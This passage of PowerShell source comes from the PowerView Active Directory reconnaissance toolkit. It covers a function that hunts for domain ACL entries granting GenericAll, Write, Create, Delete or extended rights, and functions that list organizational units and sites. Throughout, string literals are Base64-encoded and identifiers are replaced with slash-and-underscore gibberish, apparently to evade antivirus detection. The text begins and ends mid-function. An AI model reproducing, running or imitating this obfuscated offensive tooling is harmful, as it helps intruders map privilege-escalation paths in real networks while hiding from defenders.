        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/==\/===\/=\_____} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/==\/===\/=\_____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\/===\/=\_____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/=\/\/\_/\/==\/=\} = @{}
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            ${/==\/===\/=\_____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        _____/=\/\/\/\/\/= @/=\/\/\/\___/==\/ | % {
            if ( ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAB8AFcAcgBpAHQAZQB8AEMAcgBlAGEAdABlAHwARABlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AceQualifier -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))) {
                if ($_.SecurityIdentifier.Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAuACoALQBbADEALQA5AF0AXABkAHsAMwAsAH0AJAA=')))) {
                    if (${/=\/\/\_/\/==\/=\}[$_.SecurityIdentifier.Value]) {
                        ${__/\/\/\/\____/=\}, ${____/\__/\____/\/}, ${/=\_/\____/=\/\/=}, ${___/\_/\_/\____/=} = ${/=\/\/\_/\/==\/=\}[$_.SecurityIdentifier.Value]
                        ${_/\/\/\/======\/=} = New-Object PSObject
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                        }
                        else {
                            ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                        }
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) ${__/\/\/\/\____/=\}
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) ${____/\__/\____/\/}
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) ${/=\_/\____/=\/\/=}
                        ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) ${___/\_/\_/\____/=}
                        ${_/\/\/\/======\/=}
                    }
                    else {
                        ${/=\_/\____/=\/\/=} = __/=\____/===\/==\ -Identity $_.SecurityIdentifier.Value -_/=\/=\/==\/\_/=\_ DN @/==\/===\/=\_____
                        if (${/=\_/\____/=\/\/=}) {
                            ${____/\__/\____/\/} = ${/=\_/\____/=\/\/=}.SubString(${/=\_/\____/=\/\/=}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\__/\____/\/}
                            ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${/=\_/\____/=\/\/=}
                            $Object = ___/\___/\__/===\/ @_/\/\/=\_/===\_/\
                            if ($Object) {
                                ${__/\/\/\/\____/=\} = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                                    ${___/\_/\_/\____/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                                    ${___/\_/\_/\____/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                                    ${___/\_/\_/\____/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                                }
                                else {
                                    ${___/\_/\_/\____/=} = $Null
                                }
                                ${/=\/\/\_/\/==\/=\}[$_.SecurityIdentifier.Value] = ${__/\/\/\/\____/=\}, ${____/\__/\____/\/}, ${/=\_/\____/=\/\/=}, ${___/\_/\_/\____/=}
                                ${_/\/\/\/======\/=} = New-Object PSObject
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                                }
                                else {
                                    ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                                }
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) ${__/\/\/\/\____/=\}
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) ${____/\__/\____/\/}
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) ${/=\_/\____/=\/\/=}
                                ${_/\/\/\/======\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) ${___/\_/\_/\____/=}
                                ${_/\/\/\/======\/=}
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}
function ___/\/==\_/=\/==== {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${__/\_/\_/\/=\/\/=\},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/===========\_/\/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    }
    PROCESS {
        if (${/===========\_/\/}) {
            ${_____/\_/\/=\/=\_} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBPAFUAPQAuACoA')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AC8APQA9AD0APQBcAC8APQA9AFwAXwAvAD0APQA9AD0APQB9ACcAIABmAHIAbwBtACAAJwAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AJwA=')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                        ${/===========\_/\/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                        if (-not ${/===========\_/\/}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsALwA9AD0APQA9AFwALwA9AD0AXABfAC8APQA9AD0APQA9AH0AJwA=')))
                        }
                    }
                }
                else {
                    try {
                        ${_/==\/\_/==\_/\/=} = (-Join (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                    }
                    catch {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkA')))
                    }
                }
            }
            if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAE8AVQBzACAAdwBpAHQAaAAgACQAewBfAF8ALwBcAF8ALwBcAF8ALwBcAC8APQBcAC8AXAAvAD0AXAB9ACAAcwBlAHQAIABpAG4AIAB0AGgAZQAgAGcAcABMAGkAbgBrACAAcAByAG8AcABlAHIAdAB5AA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAJAB7AF8AXwAvAFwAXwAvAFwAXwAvAFwALwA9AFwALwBcAC8APQBcAH0AKgApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${/===========\_/\/}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4AYQBsAFUAbgBpAHQAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $(${/===========\_/\/}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${/===========\_/\/}.FindOne() }
            else { ${/==\_/=\____/===\} = ${/===========\_/\/}.FindAll() }
            ${/==\_/=\____/===\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${/==\_/\_/\/==\/=\} = $_
                }
                else {
                    ${/==\_/\_/\/==\/=\} = ____/=\__/\/=\__/= -Properties $_.Properties
                }
                ${/==\_/\_/\/==\/=\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBPAFUA'))))
                ${/==\_/\_/\/==\/=\}
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${/===========\_/\/}.dispose()
        }
    }
}
function __/=\_/=\_____/=\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${__/\_/\_/\/=\/\/=\},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwBpAHQAZQBzACwAQwBOAD0AQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
